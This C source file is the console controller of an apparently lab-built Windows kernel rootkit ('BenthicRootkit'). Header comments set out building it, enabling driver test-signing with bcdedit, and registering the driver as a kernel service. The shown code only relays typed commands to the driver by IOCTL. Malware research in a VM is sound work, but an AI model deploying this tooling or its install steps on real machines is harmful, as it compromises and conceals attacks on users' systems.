// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// Name:                            BenthicRootkit
// IDE:                             Open Visual Studio
// Template:                        Create a new project -> Search for templates (Alt + S) -> Console App -> Next
// Project:                         Project Name: BenthicZone01_ConsoleApplication -> Solution Name: BenthicRootkit -> Create
// Source File:                     In Solution Explorer -> Find BenthicZone01_ConsoleApplication.cpp -> Rename to Main_Application.c
// Source Code:                     Open Main_Application.c and copy the corresponding source code
// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
// Add Project:                     In Solution Explorer -> Right-click the solution (BenthicRootkit) -> Add -> New Project...
// Template:                        Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
// Project:                         Project name: BenthicZone02_KernelModeDriver -> Create
// Source File:                     Source Files -> Add -> New Item... -> Main_Driver.c
// Source Code:                     Open Main_Driver.c and copy the corresponding source code
// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
// Locate App:                      C:\Users\%USERNAME%\source\repos\BenthicRootkit\x64\Release\BenthicZone01_ConsoleApplication.exe
// Locate Driver:                   C:\Users\%USERNAME%\source\repos\BenthicRootkit\x64\Release\BenthicZone02_KernelModeDriver.sys
// Virtual Machine:                 Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
// Move App:                        Move BenthicZone01_ConsoleApplication.exe (Host) to C:\Users\%USERNAME%\Downloads\BenthicZone01_ConsoleApplication.exe (VM)
// Move Driver:                     Copy BenthicZone02_KernelModeDriver.sys (Host) to C:\Users\%USERNAME%\Downloads\BenthicZone02_KernelModeDriver.sys (VM)
// Enable Test Mode:                Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
// Driver Installation:             Open a CMD window as Administrator -> sc.exe create WindowsKernelBenthicRootkit type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\BenthicZone02_KernelModeDriver.sys"
// Registered Driver:               Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelBenthicRootkit
// Service Status:                  Run in CMD as Administrator -> sc.exe query WindowsKernelBenthicRootkit -> driverquery.exe
// Registry Entry:                  Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelBenthicRootkit
// Monitor Messages:                Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
// Start Routine:                   Run in CMD as Administrator -> sc.exe start WindowsKernelBenthicRootkit
// User Mode App:                   Open CMD -> Navigate to the directory -> Run BenthicZone01_ConsoleApplication.exe
// Clean:                           Run in CMD as Administrator -> sc.exe stop WindowsKernelBenthicRootkit
// Remove:                          Run in CMD as Administrator -> sc.exe delete WindowsKernelBenthicRootkit



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://en.wikibooks.org/wiki/Windows_Programming/windows.h
// The primary C header file for accessing the Win32 API is the <windows.h> header file. To make a Win32 executable, the first step is to include this header file in your source code. The windows.h header file should be included before any other library include, even the C standard library files such as stdio.h or stdlib.h. This is because the windows.h file includes macros and other components that may modify, extend, or replace things in these libraries. This is especially true when dealing with UNICODE, because windows.h will cause all the string functions to use UNICODE instead. Also, because many of the standard C library functions are already included in the Windows kernel, many of these functions will be available to the programmer without needing to load the standard libraries. For example, the function sprintf is included in windows.h automatically. 
#include <windows.h>

// https://en.wikibooks.org/wiki/C_Programming/stdio.h
// The C programming language provides many standard library functions for file input and output. These functions make up the bulk of the C standard library header <stdio.h>. The I/O functionality of C is fairly low-level by modern standards; C abstracts all file operations into operations on streams of bytes, which may be "input streams" or "output streams". Unlike some earlier programming languages, C has no direct support for random-access data files; to read from a record in the middle of a file, the programmer must create a stream, seek to the middle of the file, and then read bytes in sequence from the stream. 
#include <stdio.h>

// https://en.wikibooks.org/wiki/C_Programming/string.h
// String.h is the header in the C standard library for the C programming language which contains macro definitions, constants and declarations of functions and types used not only for string handling but also various memory handling functions; the name is thus something of a misnomer. 
#include <string.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "Functions/Utils/Utils01Device.h"
#include "Functions/Functions00Banner.h"
#include "Functions/Functions01Help.h"
#include "Functions/Functions02Techniques.h"
#include "Functions/Functions03Driver.h"
#include "Functions/Functions04IRPs.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Main entry point for the Benthic Rootkit Console Application.
**/
int main(void)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	printf("\033[38;5;208m[$]\033[0m Benthic Rootkit Console Application successfully loaded.\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	HANDLE hDriver = NULL;
	char command[512] = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Main loop
	while (TRUE)
	{


		// -----------------------------------------------------------------------------------------------------------------
		// Read and process user input from the command line prompt
		printf(" > ");


		// -----------------------------------------------------------------------------------------------------------------
		// Input
		if (fgets(command, sizeof(command), stdin) == NULL)
		{
			printf("  [-] Input error.\n");
			continue;
		}

		// -----------------------------------------------------------------------------------------------------------------
		// Strip newline
		command[strcspn(command, "\r\n")] = '\0';


		// -----------------------------------------------------------------------------------------------------------------
		// Skip empty input
		if (strlen(command) == 0)
		{
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Exit
		if (_stricmp(command, "exit") == 0)
		{
			break;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Clear screen
		else if (_stricmp(command, "clear") == 0 || _stricmp(command, "cls") == 0)
		{
			system("cls");
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Help menu
		else if (_stricmp(command, "help") == 0)
		{
			FunctionsHelp_ShowHelpMenu();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Banner
		else if (_stricmp(command, "banner") == 0)
		{
			FunctionsBanner_DisplayBanner();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Welcome message
		else if (_stricmp(command, "welcome") == 0)
		{
			FunctionsHelp_Welcome();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Contact information
		else if (_stricmp(command, "contact") == 0)
		{
			FunctionsHelp_Contact();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Techniques menu
		else if (_stricmp(command, "techniques") == 0)
		{
			FunctionsTechniques_ShowTechniquesMenu();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// List all commands from all available techniques
		else if (_stricmp(command, "list all") == 0)
		{
			FunctionsTechniques_ListAllCategories();
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// List all commands for a specific technique
		else if (strncmp(command, "list ", 5) == 0)
		{
			const char* arg = command + 5;
			FunctionsTechniques_ListCategory(arg);
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Check kernel driver status
		else if (_stricmp(command, "kstatus") == 0)
		{
			if (FunctionsDriver_CheckDriverStatus(&hDriver))
			{
				printf(" \033[0;32m[+] Driver is accessible.\033[0m\n");
			}
			else
			{
				printf(" \033[0;31m[-] Driver is not accessible. Try loading it first.\033[0m\n");
			}
			continue;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Custom command with optional param
		const char* param = strchr(command, ' ');
		char commandOnly[256] = { 0 };

		if (param)
		{
			size_t len = param - command;
			strncpy_s(commandOnly, sizeof(commandOnly), command, len);
			param++;
		}
		else
		{
			strncpy_s(commandOnly, sizeof(commandOnly), command, _TRUNCATE);
			param = NULL;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Try to send IOCTL to driver
		FunctionsIRPs_SendIOCTL_ExecuteCommand(hDriver, commandOnly, param);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Clean up
	if (hDriver && hDriver != INVALID_HANDLE_VALUE)
	{
		UtilsDevice_CloseDevice(&hDriver);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return 0;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
